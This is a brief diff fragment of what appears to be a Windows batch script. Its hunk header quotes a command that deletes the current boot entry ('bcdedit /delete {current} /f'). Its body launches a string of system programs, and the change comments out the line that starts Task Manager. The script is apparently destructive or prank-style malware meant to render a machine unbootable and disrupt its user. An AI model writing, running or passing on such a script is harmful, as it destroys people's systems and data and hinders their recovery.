@@ -192,7 +192,7 @@ bcdedit /delete {current} /f
  :: start regedit>nul
     start winver>nul
     start mspaint>nul
-    start taskmgr>nul
+::  start taskmgr>nul
     start wscript>nul
     start cleanmgr>nul
     start certmgr>nul
